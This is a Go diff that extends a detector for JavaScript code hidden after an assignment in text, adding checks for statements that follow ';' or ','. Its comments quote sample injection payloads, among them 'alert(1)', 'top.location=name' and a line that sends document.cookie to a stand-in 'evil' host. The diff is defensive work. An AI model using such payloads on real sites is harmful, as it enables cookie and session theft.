@@ -301,9 +301,11 @@ func isInertWord(rhs string) bool {
 
 // hasCodeAfterAssign reports whether the text after "name=" holds a template
 // literal, a call ('(' right after an identifier, ')' or ']': "alert(1)",
-// "x(1)") or a statement separator followed directly by more code
-// ("1;alert(1)"). Prose writes "level=beginner (2 weeks)" and
-// "a=1; b=2", with a blank before '(' and after ';'.
+// "x(1)"), a statement separator followed directly by more code
+// ("1;alert(1)"), or a later statement, after "; " or ", ", that is code
+// itself (see isCodeStatement: "a=1; location=name"). Prose writes
+// "level=beginner (2 weeks)" and "a=1; b=2", with a blank before '(' and
+// after ';', and its later clauses are plain words.
 func hasCodeAfterAssign(rhs string) bool {
 	for j := 0; j < len(rhs); j++ {
 		switch rhs[j] {
@@ -313,11 +315,61 @@ func hasCodeAfterAssign(rhs string) bool {
 			if j > 0 && (isIdentByte(rhs[j-1]) || rhs[j-1] == ')' || rhs[j-1] == ']') {
 				return true
 			}
-		case ';':
-			if j+1 < len(rhs) && rhs[j+1] != ' ' && rhs[j+1] != '\t' && rhs[j+1] != '\n' && rhs[j+1] != '\r' {
+		case ';', ',':
+			k := j + 1
+			for k < len(rhs) && isBlank(rhs[k]) {
+				k++
+			}
+			if rhs[j] == ';' && k == j+1 && k < len(rhs) {
+				return true
+			}
+			if k > j+1 && isCodeStatement(rhs[k:], rhs[j] == ';') {
 				return true
 			}
 		}
+	}
+	return false
+}
+
+func isBlank(c byte) bool { return c == ' ' || c == '\t' || c == '\n' || c == '\r' }
+
+// isCodeStatement reports whether st starts a JavaScript statement that does
+// something: a dotted name assigned, called or indexed ("top.location=name",
+// "document.location='//x'"), a name called with blanks before '(' or
+// tagged with a template ("alert (1)", "alert`1`"; a blank before '(' only
+// counts after ';', since "a=1, duration (2 weeks)" is prose), or a browser global
+// assigned a value that is not an inert word ("location=name",
+// "location='//evil/?'+document.cookie"). "b=2", "maybe", "e.g. later" and
+// "name=Ali" are not.
+func isCodeStatement(st string, afterSemi bool) bool {
+	i, dotted := 0, false
+	for i < len(st) && (isIdentByte(st[i]) || st[i] == '$' || st[i] == '.') {
+		dotted = dotted || st[i] == '.'
+		i++
+	}
+	if i == 0 {
+		return false
+	}
+	name := st[:i]
+	for i < len(st) && (st[i] == ' ' || st[i] == '\t') {
+		i++
+	}
+	if i >= len(st) {
+		return false
+	}
+	switch st[i] {
+	case '`':
+		return true
+	case '(':
+		return afterSemi || i == len(name)
+	case '[':
+		return dotted
+	case '=':
+		if i+1 < len(st) && st[i+1] == '=' {
+			return false // a comparison, not an assignment
+		}
+		rhs := st[i+1:]
+		return dotted && strings.TrimLeft(rhs, " \t") != "" || isBrowserGlobal(name) && !isInertWord(rhs)
 	}
 	return false
 }
